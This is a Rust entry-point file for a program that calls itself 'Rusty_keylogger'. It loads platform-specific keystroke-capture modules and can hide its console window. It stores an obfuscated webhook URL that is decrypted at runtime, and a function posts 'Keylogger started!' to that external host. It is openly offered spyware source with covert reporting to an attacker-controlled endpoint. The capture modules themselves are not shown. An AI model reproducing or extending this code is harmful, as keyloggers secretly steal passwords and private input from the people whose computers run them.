//#![windows_subsystem = "windows"]
#![allow(non_snake_case)]



#[cfg(windows)]
extern crate winapi;
#[cfg(windows)]
mod windos;
#[cfg(windows)]
use windos::start;
#[cfg(windows)]
mod win_key_codes;


#[cfg(not(windows))]
mod unix;
#[cfg(not(windows))]
use unix::start;

use hash_limette::decrypt;
use reqwest::Error;
use serde_json::json;
use tokio;


const WEB_HOOK: &str = "PTMYChAIZVkGPjkPDBgUXgECWEMDGiRXOSEnWSA4DzxLdGtEY1xTQGADDENnVW9EYFxrZ3VcExE/eAUJFjUZIAFkYgAZGCcyNyIMAhd9TQIxPjQxCHwmEhgWMCBROTcXDgNhKQ8FFw9/BSZUfRUIO0kPOwUVPAcHHA";

#[tokio::main]
async fn main() {
    println!("Starting...");
    //match send_start_message().await {
    //    Ok(_) => println!("Message sent successfully!"),
    //    Err(e) => eprintln!("Error sending message: {:?}", e),
    //}
    start().await.unwrap();
}


async fn send_start_message() -> Result<(), Error> {
    let client = reqwest::Client::new();
    let payload = json!({
        "username": "Rusty_keylogger",
        "avatar_url": "https://i.imgur.com/4M34hi2.png",
        "content": "Keylogger started!"
    });
    let res = client.post(decrypt(WEB_HOOK, None))
        .json(&payload)
        .send()
        .await?;
    Ok(())
}